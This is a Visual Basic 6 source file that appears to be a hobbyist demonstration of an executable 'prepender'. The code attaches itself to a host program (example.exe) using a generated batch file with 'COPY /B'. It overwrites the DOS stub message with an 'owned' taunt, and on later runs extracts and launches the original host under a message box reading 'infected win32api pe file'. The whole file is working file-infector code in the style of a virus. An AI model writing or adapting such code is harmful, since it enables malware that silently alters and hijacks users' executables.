VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Prepend Example"
   ClientHeight    =   3915
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   4920
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   ScaleHeight     =   3915
   ScaleWidth      =   4920
   StartUpPosition =   2  'CenterScreen
   Begin VB.Label Label1 
      Height          =   855
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4575
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public Sub Form_Load()
Me.Show
'pass on any shell commands here
Call cmd(Command)
End Sub
'Public Function GetPath(path As String) As String
'GetPath = Left(path, InStrRev(path, "\"))
'i love vb pre packaged functions...
'x86 assembly isnt so kind...
'End Function
Public Function GetFile(path As String) As String
GetFile = Right(path, Len(path) - InStrRev(path, "\"))
'ditto
End Function
Public Function cmd(cm As String)
'On Error Resume Next
Dim iTemp As Long
Dim FileData As String, sTemp As String
'open up, looks look around for our header
'if there then run the original exe
'if not then prepend the example exe
Open App.path & "\" & App.EXEName & ".exe" For Binary As #1
FileData = Space$(LOF(1))
Get #1, , FileData
'find the header as long as its in blank spaces eg: vbcrlf
iTemp = InStrRev(FileData, "Old Exe Header")
'check to see if this file is already prepened or not
'0 = not, anything else = yes
If iTemp <> 0 Then
iTemp = iTemp + 17
'get are exe data...
'only tested it on 13.3 megs max
' i guess it can do up to 2 gigs
sTemp = String(LOF(1), 0)
Get #1, iTemp, sTemp
Else
'0 down here, prepend our example exe here
Close #1
'invoke are prepend function
Call PrependEXE(App.path & "\example.exe")
Exit Function
End If
'dont want to get ugly now...
Me.Visible = False
Close #1
'make a temp exe for the original exe
Open App.path & "\example.tmp.exe" For Output As #1
Print #1, sTemp
Close #1
'give it some time...
Pause 3
'what ever you want to say here
MsgBox "Hello there:" & vbCrLf & "the application you just ran has been prepended by a vb application.", vbOKOnly, "infected win32api pe file"
'run the original exe and send the shell commands
Shell App.path & "\example.tmp.exe " & cm, vbNormalFocus
End
End Function
Sub Pause(interval)
Dim Current
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub
Public Sub PrependEXE(exe As String)
'On Error Resume Next
Me.Label1.Caption = "Prepending " & exe
Dim nfile As Integer
nfile = FreeFile
Dim sTemp2 As String
Open App.path & "\temp.tmp" For Output As #1
Open App.path & "\" & App.EXEName & ".exe" For Binary As #2
While Not EOF(2)
sTemp = Input$(2000, #2)
sTemp2 = sTemp2 & sTemp
'replace the win32 only error with something stupid...dont ask
'just thought some of you would want to know how to
'mess around with that kind a thing
sTemp2 = Replace(sTemp2, "This program cannot be run in DOS mode.", "Th1s pr0gram haz b33n 0wn3d f0r phr33!!")
Print #1, sTemp2;
sTemp2 = ""
Wend
'make ourselfs a refference point in this mixed
'up mass of binary...
Print #1, "Old Exe Header" & " "
Close #2
Close #1
nfile = FreeFile
Dim Tmp1 As String
'get the file name
Tmp1 = GetFile(exe)
'copy the old exe to our tmp file inorder to fool w/ latter on in the code
FileCopy exe, App.path & "\" & Tmp1 & ".tmp"
Pause 1
'add the two files together using dos!!!
'yeah i know, but i gave up on trying to add them using vb.... i almost had it,
'infact i know how to, but by the time i figured out how to do it i had figured out how to
'extract the orginal EXE..
Open App.path & "\temp.bat" For Output As #nfile
Print #nfile, "COPY /Y /B " & Chr(34) & "temp.tmp" & Chr(34) & "+" & Chr(34) & Tmp1 & ".tmp" & Chr(34) & " " & Chr(34) & "temp2.tmp" & Chr(34)
Close #nfile
'wait for the file so we dont get any errors..
Do Until FileLen(App.path & "\" & Tmp1 & ".tmp") >= FileLen(exe)
Pause 0.05
Loop
'run are little addition batch
Shell App.path & "\temp.bat", vbNormalFocus
Pause 5
'copy the final product to the old spot of the original exe
FileCopy App.path & "\temp2.tmp", exe
Pause 1
'delete the rest of the files we dont need
'commented it out because i know some of you
'might want to hex edit and view these
'Kill App.path & "\" & Tmp1 & ".tmp"
'Kill App.path & "\temp.tmp"
'Kill App.path & "\temp2.tmp"
Kill App.path & "\temp.bat"
Label1.Caption = "Done"
Pause 2
'send a shell command to the app.
Me.Label1.Caption = "now lets shell it with a command!"
Shell App.path & "\example.exe " & InputBox("Now, type in a message to send to the prepended app and watch what happens:", "", "hi! this is kool")
End
Exit Sub
End Sub
